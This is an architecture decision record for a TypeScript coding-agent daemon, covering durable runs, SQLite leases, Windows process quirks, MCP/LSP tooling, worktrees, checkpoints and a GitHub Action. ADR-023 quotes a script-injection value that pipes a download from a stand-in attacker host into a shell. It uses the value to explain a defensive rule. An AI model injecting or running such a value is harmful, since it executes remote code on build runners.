# Architecture Decisions

## ADR-001 — Durable Run is the primary execution unit

**Decision:** The hierarchy is Mission → Run → Goal / Task Graph / Agent Graph
→ Agent → SessionEpoch → LLM turn. The daemon, not any client or model turn,
owns durable Run state.

**Why:** It permits disconnect, restart, compaction, recovery, and executor
takeover without confusing a conversation with the actual engineering mission.

## ADR-002 — Node 24 plus pnpm, strict TypeScript

**Decision:** Build an ESM TypeScript pnpm workspace targeting Node 24.19.0.

**Why:** The product must eliminate Bun/OpenTUI coupling. Node 24 supplies a
supported SQLite API locally without assuming native build tooling.

## ADR-003 — SQLite event log with normalized projections

**Decision:** The control plane will use SQLite WAL, migrations, transactional
event append, and typed materialized tables rather than a single JSON state
document.

**Why:** Append-only events make recovery/audit possible while projections keep
normal read paths fast and typed.

## ADR-004 — Loopback HTTP + SSE protocol

**Decision:** The daemon exposes a versioned local HTTP API and persisted SSE
stream. CLI and SDK consume that protocol only.

**Why:** It cleanly separates clients from execution and supports reconnect via
persisted event sequence IDs. Non-loopback operation will require auth.

## ADR-005 — Donor provenance is selective and explicit

**Decision:** Donors are research material; no donor repository or Git history
will be embedded. The Claude Code archive is concept-only and source reuse is
forbidden.

**Why:** Ottili Coder must be an independent Apache-2.0 product with accurate
attribution and maintainable architecture.

## ADR-006 — One line-ending contract enforced by `.gitattributes`

**Decision:** Every text path is normalized to LF in the repository and checked
out as LF on all platforms. `.prettierrc.json` states `endOfLine: "lf"`
explicitly and `pnpm check:eol` fails with a named diagnostic before
`prettier --check` runs.

**Why:** The first Windows CI job failed `prettier --check` on effectively the
whole tree because Git for Windows had converted sources to CRLF at checkout.
Relaxing Prettier would have hidden the cause and split formatting per
platform; pinning the checkout keeps one contract and one diff.

## ADR-007 — Cooperative daemon shutdown is a protocol request, not a signal

**Decision:** `POST /v1/daemon/shutdown` stops the daemon. The request carries
the daemon `instanceId` and is refused if it does not match. The CLI asks over
the protocol first and only falls back to `SIGTERM`.

**Why:** Windows has no graceful termination signal — Node maps
`process.kill(pid, "SIGTERM")` onto `TerminateProcess`, so the daemon's handler
never runs and the scheduler/HTTP/SQLite close order is skipped. Binding the
request to an instance identity is also a stronger guarantee than the PID-reuse
mitigation in `KP-017`, because identity is verified by the process that acts.

## ADR-008 — Windows batch commands run under a strict argument contract

**Decision:** The `execute_command` tool resolves a Windows command through
`PATHEXT` before spawning. A `.cmd`/`.bat` target is routed through
`cmd.exe /d /s /c` with MSVCRT quoting, and any argument containing a cmd
metacharacter (`" & | < > ^ % ! ( )` or a newline) is refused.

**Why:** Node deliberately refuses to spawn batch files without a shell, so
`npm`/`pnpm` were simply unrunnable on Windows. cmd's quoting rules are
context-dependent and `%VAR%` expansion cannot be reliably suppressed on a
command line, so escaping would be a guess whose failure mode is command
injection. Refusing the small set of characters that would need escaping keeps
the default-deny posture auditable.

## ADR-009 — Path identity is filesystem-canonical, never string equality

**Decision:** Comparisons between a caller-supplied path and a Git-reported
path go through `canonicalizePath`, which resolves symlinks (including for
paths that do not exist yet) and compares case-insensitively on Windows and
macOS.

**Why:** macOS CI failed creating a worktree because `os.tmpdir()` is
`/var/folders/...` while Git reports `/private/var/folders/...`. `path.resolve`
never follows links, so a correctly created worktree looked missing.

## ADR-010 — Executor-owned durable writes always carry a lease; the Store asserts it belongs to the Run being written

**Decision:** Every `RunStore` mutator an executor calls (not just tool/agent
lifecycle writes) takes a `FencedLease` and asserts both that the lease is
current and that `lease.runId` matches the row being written. A small set of
writes an operator path may also make (memory, problems, goal status) take an
_optional_ lease and assert it only when supplied.

**Why:** An audit of all 81 public `RunStore` methods found 11 executor-owned
mutators — milestones, decisions, artifacts, git changes, recovery state,
checkpoints — with no lease parameter at all. A superseded executor could
still write through them after a takeover. Resource locks were a sharper case:
they were held by executor id alone, so a daemon that reuses its configured
executor id across a restart could release the locks of the generation that
replaced it. Migration 4 adds a `lease_generation` column to `resource_locks`
so ownership is `(executor_id, generation)`, not `executor_id` alone.

## ADR-011 — Usage and cost are idempotent, keyed by session epoch

**Decision:** `recordUsageFenced` and `recordCost` accept an `entryKey`
(the session epoch id). A repeated write for the same key is a no-op that
returns the existing record rather than adding to the shared budget again.

**Why:** Usage and cost were previously added unconditionally. A turn replayed
after a crash, a takeover, or a provider retry would charge the shared Run
budget twice, which silently starves every other agent working the same Run —
a correctness bug that would only show up as an unexplained early
`budget_limited` transition days into a long-horizon mission. Migration 5 adds
a `usage_entries` table with a `(run_id, entry_key)` primary key and a partial
unique index on `cost_records(run_id, entry_key)`.

## ADR-012 — A tool's resource scope is namespaced as a path, not joined with a colon

**Decision:** `namespacedIdentifier(workspaceUri, identifier)` joins a tool's
scope under the workspace as `${root}/${relative}`, and the coordinator
authorizes tools using this namespaced form (previously it authorized the
_un_-namespaced scope and only namespaced it afterward for locking).

**Why:** Building the daemon-kill acceptance test surfaced a real defect: the
prior code joined scopes as `` `${workspaceUri}:${scope.identifier}` ``, which
produced a value like `file:///workspace:packages/x.ts` — not a path, so no
`sandbox.filesystem.writableRoots` prefix check could ever match it. Every
workspace write silently fell through to `prompt` under the `standard` policy
regardless of the configured sandbox, and under `autonomous` the _authorized_
scope and the _locked_ scope were computed differently, which was merely
lucky rather than correct. This is why `--permission-mode` and a Run-creation
`sandbox` are exposed through the API/CLI now: raising the policy without also
granting the workspace as writable is a configuration error, not silently a
no-op.

## ADR-013 — `execute_command` failures report stdout, not only stderr

**Decision:** A non-zero exit from the `execute_command` tool reports the
trimmed, non-empty concatenation of stdout and stderr, not stderr alone.

**Why:** Test runners (Node's own `--test` included) report assertion detail
on stdout. An agent given only stderr on a failing test run sees `exited 1`
and nothing else — it cannot read _why_ the test failed, which defeats the
entire reproduce-then-fix loop a debugging agent depends on.

## ADR-014 — `store.ts` splits its data layer, not its transaction boundaries

**Decision:** `packages/control-plane/src/store.ts` was decomposed by
extracting the parts that carry no transactional state of their own — error
classes (`store/errors.ts`), input/output type declarations (`store/types.ts`),
row-to-entity mapping (`store/mappers.ts`, 18 functions of `(database, row)`),
and row-parsing primitives (`store/row-helpers.ts`). The `RunStore` class
itself — every lease-fenced write, every `xxxInternal` orchestration method,
every `mustXxx` accessor — stays one class in one file.

**Why:** `SqliteDatabase.transaction()` wraps `BEGIN IMMEDIATE`/`COMMIT` and is
not reentrant; SQLite rejects a nested `BEGIN`. Most of `RunStore`'s public
methods open exactly one transaction and orchestrate several domains inside
it — `createRun` touches missions, runs, goals, agents, and requirements
atomically; `proposeCompletion` touches requirements, validations, and the run
transition together. Splitting these into independent per-domain classes
(TaskGraphStore, AgentGraphStore, …) would force a choice between breaking
that atomicity or building a materially larger shared-context/mixin
architecture than this pass's risk tolerance allowed, given that this file is
where every lease-fencing guarantee proven this session (R17, the
competing-daemon-takeover suite) actually lives. The mapping/type extraction
was verified purely mechanically — full typecheck plus the complete test
matrix, including the real-`SIGKILL` daemon-kill mission and the
competing-daemon takeover suite — with zero behavior change, since every
extracted function only ever depended on the `database` handle it now takes
as an explicit parameter.

## ADR-015 — A workspace path is recognized as a path before it is ever tried as a URL

**Decision:** `apps/cli/src/commands.ts`'s `workspaceUri()` matches the input
against `/^[A-Za-z]:[\\/]/` (a Windows drive letter) before attempting
`new URL(value)`, and routes a match straight to the path-resolution branch.

**Why:** `new URL("C:\\Users\\x")` does not throw — a single letter followed by
`:` is syntactically a valid URL scheme, so Node's WHATWG URL parser accepts
it with `protocol` `"c:"`. Every Windows absolute `--workspace` path was
therefore treated as an already-formed URI instead of a filesystem path,
producing a value that starts with `c:`, not `file:`. Every downstream
consumer (`daemon-process.ts`'s `workspacePath()`) checks
`startsWith("file:")` and silently falls back to the daemon's own working
directory on a mismatch — the CLI reported a successful Run while the daemon
quietly acted on the wrong directory. This was undetected until
`tests/e2e/daemon-kill-mission.test.ts` ran on Windows CI for the first time
and failed reproducing a test file that only exists in the fixture, not the
product checkout.

## ADR-016 — SQLite initialization retries transient Windows IOERR as one unit, synchronously

**Decision:** `SqliteDatabase`'s constructor retries its _entire_
initialization sequence — open, all three startup pragmas, and migration —
as one unit (bounded, exponential backoff, capped at 500 ms per attempt, 8
attempts) when a step fails with `ERR_SQLITE_ERROR` and a result code in the
`SQLITE_IOERR` family, or `SQLITE_BUSY`/`SQLITE_LOCKED`/`SQLITE_CANTOPEN`. A
failed attempt closes its partially-initialized connection before retrying
from a fresh open. The wait between attempts is a synchronous `Atomics.wait`
sleep, since `node:sqlite`'s API — and therefore `SqliteDatabase`'s
constructor, and everything built on top of it (`RunStore`, `DurableDaemon`)
— is synchronous throughout; making the constructor async would cascade
through the whole control plane for a fix that only needs to cover a few
hundred milliseconds.

**Why:** The daemon-kill acceptance test's first Windows CI run (immediately
after the KP-026 fix) failed with `disk I/O error` / `errcode: 1546`
(`SQLITE_IOERR_TRUNCATE`) when opening a fresh connection to the same file a
just-`SIGKILL`ed process had held. `SIGKILL` gives a process no chance to call
`close()`, and Windows can hold the file's OS-level handle for a brief window
after the process has already exited. The first version of this fix retried
only the raw `new DatabaseSync(path)` call and failed identically on the very
next CI run: the IOERR was actually coming from the `PRAGMA journal_mode =
WAL` switch immediately _after_ a successful open — a WAL/truncate operation
— not the open itself, so the retryable window has to cover the whole
initialization sequence, not just its first step. This is not only a test
artifact: it is exactly the shape of a real production daemon restart after a
Windows crash, so the fix belongs in the product's `SqliteDatabase`, not in
the test. The same drive-letter-as-URL-scheme root cause as ADR-015 was also
found and fixed proactively in the LSP config validator (`assertAbsoluteUri`,
KP-028) while auditing for the same pattern elsewhere in the codebase.

## ADR-017 — MCP and LSP compose into the same durable capability pipeline every other tool uses; the resolver becomes async to allow it

**Decision:** `createMcpTools` (`packages/runtime/src/mcp-tools.ts`) turns each
of an `McpServerSupervisor`'s _connected_ servers' declared tools into
`ToolDefinition`s via `@ottili/integrations`' existing `toMcpToolDefinition`
conservative-default mapper (`external`+`network` required,
`requiresApproval: true`, a `service:mcp:<server>` resource scope), wrapping
each call through the MCP client with output truncation. A disconnected
server contributes no tools. `LspServerManager`
(`packages/runtime/src/lsp-tools.ts`) does two things: it implements the
coordinator's existing `DiagnosticsProvider` port (so LSP diagnostics reach
the context compiler the same way any other context source does) and exposes
three read-only tools (`lsp_diagnostics`, `lsp_document_symbols`,
`lsp_definition`) that need no approval. Both are wired into
`apps/cli/src/daemon-process.ts` behind opt-in, declarative-only env config
(`OTTILI_MCP_SERVERS`, `OTTILI_LSP_SERVERS`) that names an
already-installed `command` — nothing resolves a package name or downloads a
binary at daemon startup. `RunCoordinator`'s `WorkspaceToolResolver` type
widened from a sync `(input) => ToolRegistry` to `(input) => ToolRegistry |
Promise<ToolRegistry>` so the daemon's tool factory can `await
createMcpTools(...)` per Run without the coordinator special-casing MCP.

**Why:** The mission's explicit instruction was "do not leave MCP/LSP as
isolated demos — integrate them into the runtime capability system" following
permissions, approval policy, sandbox policy, resource scopes, and Run/Agent
attribution exactly like any other tool. Reusing `toMcpToolDefinition` and the
coordinator's existing `authorizeTool`/lease/resource-lock pipeline (rather
than inventing a parallel MCP-specific policy path) means an MCP tool call is
provably subject to the same default-deny sandbox check, the same durable
approval gate, and the same resource-lock namespacing as `execute_command` or
any workspace-write tool — proven directly by
`tests/integration/mcp-lsp-composition.test.ts`. Building that test surfaced
a real lesson, not a product bug: an MCP tool's declared `network` permission
is checked against the agent's _sandbox_ (`sandbox.network.enabled`, default
`false`) independently of, and before, the approval-prompt check —
`evaluatePermission`'s most-restrictive-wins ranking means a sandbox-capability
`deny` outranks an approval `prompt`. The first draft of the integration test
assumed the default sandbox would approval-gate the call; it was actually
denied outright before ever reaching a durable approval or the MCP server.
That is correct default-deny behavior, so the fix was to the test, not the
code — it now has one case proving the default-sandbox denial and a second,
separately-scoped case with an explicit network-enabled sandbox proving the
approval-then-execute path. `LspServerManager`'s tools stay unapproved by
design: `sideEffectClass: "none"`/`"read"` never carries `requiresApproval`,
matching every other read-only tool in the runtime.

## ADR-018 — A delegated Agent's worktree is provisioned by the coordinator, durable-once, and a sibling of the primary workspace

**Decision:** `RunCoordinator` gains an optional `worktrees: WorktreeProvisioner`
port. Before resolving tools or compiling context for a turn, `ensureAgentWorktree`
returns the Mission's own `workspaceUri` unchanged for the coordinator Agent
and for any delegate that opts out of the feature (`worktrees` unset), but for
a delegate (any non-coordinator role) with no `worktreeUri` yet, it calls
`provision()`, records the result durably via the new lease-fenced
`RunStore.setAgentWorktree` (settable once — an Agent that already has one
keeps it for its whole lifetime), and returns that URI instead. Every
downstream use of "the workspace" for that turn — tool resolution,
`createDurableTools`'s resource-scope namespacing, and the context
compiler's Git status/diff/RepoMap/diagnostics — receives this _effective_
URI, not the Mission's raw one. The concrete adapter, `GitWorktreeProvisioner`
(`packages/runtime/src/worktrees.ts`), places each worktree at
`<parent-of-primary>/.ottili-worktrees/<runId>/<agentId>`, detached at HEAD
(never a new branch), and is itself idempotent by path: if a prior attempt
created the worktree on disk but crashed before the durable write committed,
the retry finds and reuses it via `WorktreeManager.find` instead of failing
on Git's refusal to recreate a non-empty path. The daemon wires
`GitWorktreeProvisioner` in unconditionally (opt-out via
`OTTILI_DISABLE_AGENT_WORKTREES=true`), since provisioning is best-effort —
a failure (e.g. the workspace is not a Git repository) is recorded as a
durable `agent.progress` event and falls back to the shared workspace rather
than blocking the delegate's turn.

**Why:** Delegates previously always shared the coordinator's single
workspace, so two agents editing concurrently — the exact shape long-horizon
multi-agent delegation produces — could race each other's file writes with no
isolation at all. Placing worktrees as a _sibling_ of the primary workspace
(rather than nested inside it) avoids every edge case of a Git worktree
appearing inside its own primary's tracked tree (accidental `git add -A`
capture, `.gitignore` coupling); the cost is that a sandbox's `writableRoots`
configured only with the primary workspace does not automatically cover it,
which is why `tests/integration/worktree-composition.test.ts` grants a
shared parent directory explicitly and why this gap is recorded as `KP-031`
rather than silently worked around in the product. Provisioning happens in
the coordinator, not as a mission tool, because it is infrastructure the
Run's own trust boundary already covers (the operator granted the _Mission's_
workspace at Run-creation time; a delegate's worktree is that grant's own
implementation detail, not a new capability), matching how the coordinator
already establishes leases and session epochs outside the model-facing
tool/policy pipeline. `tests/integration/worktree-composition.test.ts`
proves both directions of the isolation (the coordinator's own write lands
in the primary workspace; the delegate's lands only in its worktree) and
restart survival with a genuinely fresh `RunStore`/`RunCoordinator`/
`GitWorktreeProvisioner` instance attached to the same durable journal — the
reused worktree still contains the file the pre-restart turn wrote there.

## ADR-019 — A checkpoint is captured by the coordinator at task completion, using the durable metadata shape the API already serves

**Decision:** `RunCoordinator.createMilestoneCheckpoint` (opt-in via
`checkpointOnTaskCompletion`, on by default in the daemon) triggers whenever
a turn's `result.toolExecutions` contains a successful `complete_task` call
— detected the same way `requestedCompletion` already is. It captures a
real Git snapshot via `GitService.captureCheckpoint` (the same
private-ref primitive `CheckpointService`/`packages/recovery` restores
from) and writes it through `RunStore.createCheckpoint` — the lightweight
`(label, reason, workspaceRef, manifest)` shape that the `checkpoints` list
API/SDK/CLI already serve, but which had no callers before this, so `ottili-coder
checkpoints list` always returned an empty list regardless of how much a Run
had actually done. The manifest carries real durable state (agent
roles/statuses, requirement statuses, task statuses/titles), not a
placeholder. Best-effort throughout: a non-Git workspace, or any other
failure, is recorded as a durable `agent.progress` event and never blocks
the Run — a checkpoint is a convenience for later inspection/restore, not a
correctness requirement the way a lease or a resource lock is.

**Why:** `packages/recovery`'s `CheckpointService`/`CheckpointRecord<TState>`
already had full create/restore/rollback semantics, transactionally tested
in `tests/unit/workspace-recovery.test.ts` — that half of "compose
checkpoints" was never the gap. The gap was that nothing in the live
runtime ever called `RunStore.createCheckpoint` at all, despite the API,
SDK, and CLI surface for listing checkpoints already existing and being
exercised end-to-end elsewhere. Reusing that existing metadata shape (label/
reason/workspaceRef/manifest) rather than also wiring `CheckpointService`'s
richer, differently-shaped `CheckpointRecord<TState>` into the coordinator
keeps this increment honest about what it closes: creation at a durable
milestone, visible through the surface that already exists. A full
`checkpoint restore` CLI/API flow — which needs to pause the Run, apply the
Git snapshot, restore durable state consistently, and resume — is
deliberately out of scope here and left as an explicit follow-up, the same
way `KP-031` was left open rather than silently worked around. Triggering on
`complete_task` specifically (not, say, every N turns) ties a checkpoint to
a concrete, evidence-backed unit of progress a later restore would actually
want to return to, rather than an arbitrary time- or turn-based interval.

## ADR-020 — A delegate's own worktree is granted as writable ephemerally, per turn, never durably

**Decision:** `RunCoordinator.sandboxForTurn(agent, workspaceUri,
missionWorkspaceUri)` adds `workspaceUri` (the _effective_, worktree-aware
URI `ensureAgentWorktree` already resolved) to a **copy** of the acting
Agent's `sandbox.filesystem.writableRoots`, only when it differs from the
Mission's own `workspaceUri`, and only for the object handed to
`createDurableTools`'s authorization checks this turn. `createMissionTools`
— the thing `delegate_task` reads `agent.sandbox` through to set a new
child's _durable_ sandbox — still receives the original, unwidened `acting`.
Nothing is written back to the `agents` table.

**Why:** `GitWorktreeProvisioner` places a delegate's worktree as a sibling
of the primary workspace, a path a `writableRoots` entry scoped to the
Mission's own workspace (the CLI's own default) cannot cover — confirmed
directly by `KP-031`, where even the _test's own_ explicit grant of the
worktree's parent directory still silently denied the write on macOS/Windows
because of a canonicalization mismatch between the grant and the namespaced
scope. Widening the durable `agents.sandbox_json` row instead was
considered and rejected: it would let the widening leak into a further
delegate spawned via `delegate_task` (which inherits `sandbox: agent.sandbox`
unchanged) — a grandchild would durably inherit write access to its
_parent's_ worktree, a capability nobody granted it and that would outlive
the parent's own task. Scoping the grant to one turn's authorization check
keeps the durable sandbox row meaning exactly what an operator configured,
while still letting a delegate work inside the isolation the coordinator
itself decided to provision.
`tests/integration/worktree-composition.test.ts` was deliberately narrowed
to grant only the primary workspace (the previous `parent`-directory
workaround removed) and still passes, proving the fix — not a broader
pre-configured grant — is what makes the delegate's write succeed.

## ADR-021 — Checkpoint restore is workspace-only, gated on a paused Run, and reached through an injected port

**Decision:** `POST /v1/runs/:id/checkpoints/:checkpointId/restore`
(`packages/server/src/server.ts`) restores a checkpoint's Git snapshot into
the Run's primary workspace. It refuses (400) unless `run.status ===
"paused"`, refuses (404) an unknown checkpoint or one with no
`workspaceRef`, and refuses (501) if the daemon was not given a
`CheckpointRestorer`. The actual Git work — `GitCheckpointRestorer`
(`packages/runtime/src/checkpoint-restore.ts`) — always captures an
undoable pre-restore snapshot first, then calls the same
`GitService.restoreWorkspaceSnapshot` primitive `CheckpointService` uses
internally, and is injected into `OttiliDaemonServer` by the daemon
composition root exactly the way MCP/LSP/worktree capabilities already are:
`server` cannot depend on `@ottili/workspace` (a boundary rule), and
`runtime` has no reason to depend on `server` (an outer layer), so
`GitCheckpointRestorer` matches the `CheckpointRestorer` port structurally
rather than importing it. `RunStore.recordCheckpointRestore` durably
records the outcome as an operator action — no lease, the same as
`resolveApproval` — re-asserting the paused precondition as defense in
depth alongside the route's own check. `RunStore.getCheckpoint(runId, id)`
was added as a small, honest single-row accessor rather than filtering
`listCheckpoints` at every call site.

**Why:** Restore is deliberately scoped to the workspace only — reverting
files to the checkpoint's snapshot — not a full point-in-time
reconstruction of the durable Task/Agent Graph and history, which would
need to replay the entire event log and is a materially larger feature than
what this closes; `RunCoordinator.createMilestoneCheckpoint`'s manifest was
already scoped as a summary, not a state dump sufficient for that anyway.
Gating on `paused` (an existing Run status, reachable through the existing
`run pause` command) rather than inventing a new scheduled-action type or
lease-based coordination keeps the increment bounded: it reuses a primitive
that already exists instead of extending `RunScheduler`'s
`continue_goal`-only action dispatch to a second action type. Investigating
whether a full `GitCheckpointSnapshot` needed to be stored durably (beyond
the bare `workspaceRef` this session's checkpoint composition already
persists) found that it does not: `GitService.readCheckpointSnapshot`
already reconstructs `commit`/`baseCommit`/`indexCommit` from a ref alone
by reading the commit's parents, and `restoreWorkspaceSnapshot` already
accepts a bare ref string directly — so no prerequisite change to the
create side was needed. `tests/integration/checkpoint-restore.test.ts`
proves the refusal-while-not-paused case, the successful revert with a
real resolvable pre-restore ref, refusal for an unknown checkpoint id, and
the 501 when no restorer is configured.

## ADR-022 — R45–R49 proven against the real provider/backend implementations, not the dead `packages/integrations/src/provider.ts` adapters

Investigating R45 ("Ottili AI adapter exists") and R47 ("Ottili Auth
integration exists for managed services") found that their named subject —
`OttiliAiAdapter`/`ManagedAuthAdapter`/`OpenAiCompatibleAdapter`/
`ProviderHttpError` in `packages/integrations/src/provider.ts` — has zero
callers anywhere else in the tree (`KP-034`). It is an earlier iteration's
implementation, structurally duplicating the real, live mechanism that
`apps/cli/src/daemon-process.ts` actually uses:
`packages/runtime/src/provider-registry.ts`'s `createTurnProvider`, whose
`"ottili"` case builds a `ManagedTokenTurnProvider` wrapping
`OpenAiCompatibleTurnProvider`. Writing a "focused contract test" for the
dead adapter would satisfy the letter of R45 while proving nothing about
what the daemon actually runs — exactly the fake-placeholder pattern this
project rules out. R45/R47 were instead retargeted onto the real
mechanism: `tests/unit/providers.test.ts` gained a mocked-fetch round trip
proving the `Authorization: Bearer <token>` header reaches the request,
per-turn re-fetch of the token (rotation without restarting the daemon,
matching the doc comment on `ManagedTokenTurnProvider`), and a rejected
supplier converting to a durable `authentication` `ProviderFailure` rather
than an opaque throw.

That token supplier was, until this change, never actually reachable from
the CLI: `daemon-process.ts` called `createProviderRuntime` without an
`ottiliAccessToken` option at all, so selecting `OTTILI_PROVIDER=ottili`
always hit the "standalone installation" `ProviderConfigurationError`
regardless of any credential present in the environment — the managed path
existed only as an internal API nothing supplied. `daemon-process.ts` now
reads `OTTILI_ACCESS_TOKEN` the same way every other provider kind reads
its `apiKeyEnv` credential — synchronously, at startup, so a genuinely
unconfigured managed install still fails fast into `UnconfiguredProvider`
exactly as before — but wraps it in a supplier that re-reads
`process.env.OTTILI_ACCESS_TOKEN` on every call rather than capturing it
once, so a token mutated in the daemon's own process environment takes
effect without a restart. BYOK/local kinds are entirely unaffected: the
supplier is only ever constructed, and only ever passed, when
`OTTILI_ACCESS_TOKEN` is present. R46 (BYOK) closed the same way from the
other direction: the existing test only checked `provider.id` after
construction, never that the configuration-driven path actually completes
a turn; a new test drives `createTurnProvider({kind:"openai"}, {environment})`
through a mocked fetch end to end with zero Ottili involvement.

R48 ("Local execution backend works") and R49 ("Remote/Hybrid interfaces
exist and are testable") name `packages/integrations/src/backend.ts`'s
`ExecutionBackend` family, confirmed to have the same wiring gap as
`provider.ts`: zero references anywhere in `packages/runtime/src` or
`apps/cli/src`. Unlike `provider.ts`, this is not dead/duplicate code to
retarget away from — `execute_command` (`packages/runtime/src/builtins.ts`)
never had a competing implementation to fall back on; `ExecutionBackend`
is simply an abstraction that was never composed into the live tool path.
Composing it properly would mean `execute_command` constructing and
delegating to a `LocalExecutionBackend`, but a side-by-side read of both
implementations found `execute_command`'s own `execute()` helper is
materially more hardened: it routes through `resolveCommandTarget`
(`packages/runtime/src/command-target.ts`) for Windows batch/PATHEXT
resolution, incrementally truncates output to `maxOutputBytes`, and fixes
an abort-registration race — none of which `LocalExecutionBackend.execute`
has. Swapping the call site to the weaker implementation would be a
regression, not a composition, and porting the hardening across first is
blocked by `scripts/check-boundaries.mjs`'s package rule: `integrations`
may depend only on `@ottili/core`/`@ottili/protocol`, not `@ottili/runtime`,
so `command-target.ts` cannot be imported where `backend.ts` lives without
first relocating shared process-exec helpers to a lower package — a real
dependency-graph decision, not a mechanical fix, and disproportionate to
bolt onto this increment. R48 is therefore left UNPROVEN, honestly,
tracked as `KP-035`, with its own full lifecycle contract tests added
(start/health/execute/cancel/cleanup, abort-via-signal) so the abstraction
itself is at least proven correct in isolation. R49's narrower, literal
wording — deterministic remote/hybrid _contract tests_ — does not depend
on that composition question at all: new tests against a fake
`RemoteExecutionTransport` and fake local/remote backends prove
`RemoteExecutionBackend`'s full delegation and `HybridExecutionBackend`'s
local-preferred/fallback-to-remote behavior for both `execute` and
`health`, so R49 moves to PROVEN independently of R48.

## ADR-023 — The GitHub Action passes every templated value through `env:`, never interpolates `${{ }}` directly into a `run:` script

**Decision:** `action.yml` (a composite action wrapping `run`/`run status`/
`daemon start`/`daemon stop` into a headless-Mission workflow step) assigns
every `${{ inputs.* }}` and `${{ steps.*.outputs.* }}` value it needs inside
a `run:` block to an `env:` variable first, and references it in the script
as an ordinary shell variable (`"$MISSION_PROMPT"`), never by writing the
`${{ }}` expression directly into the script text.

**Why:** GitHub Actions expands `${{ }}` expressions as a literal text
substitution into the step's script _before_ the shell ever parses it. An
input like `prompt` is exactly the kind of free-text, externally-supplied
value the composite action's own security note calls out: a value
containing `"; curl attacker.example | sh #` or backticks would execute
inside the runner's shell the moment the expression was substituted in,
regardless of any quoting written around the `${{ }}` token in the YAML —
this is documented by GitHub itself as a script-injection anti-pattern, not
a hypothetical. An `env:`-assigned variable goes through the runner's
ordinary environment-variable mechanism instead: the shell receives the
value as data in a variable, subject to normal shell quoting rules the
script already controls (`"$MISSION_PROMPT"`), never as script text. Every
step in `action.yml` that touches a `${{ }}` expression follows this rule,
including values that originate from the action's own prior steps (the
config directory path, the created Run's id) — treated with the same
discipline as the untrusted `prompt` input, since consistency is what makes
the pattern auditable at a glance rather than something that has to be
re-verified per value.

The action's own smoke test (`.github/workflows/ci.yml`'s `action-smoke`
job) exercises this action against the repository's own checkout, with no
provider credentials configured, and asserts the action reports the
resulting `waiting_external` Run status through `continue-on-error` plus an
outcome assertion — proving the action's plumbing (daemon start, Run
creation, status polling, non-completion failure) without needing a real
provider key in this repository's CI. Full end-to-end coverage of a Run
that actually reaches `completed` through the action is not attempted here
for the same reason `tests/e2e/daemon-kill-mission.test.ts` uses a
deterministic BYOK-shaped HTTP provider rather than a live one: this
environment has no real provider credential to spend, and the smoke test's
job is to prove the wrapper is correct, not to reprove the underlying Run
lifecycle the rest of the test suite already covers directly.
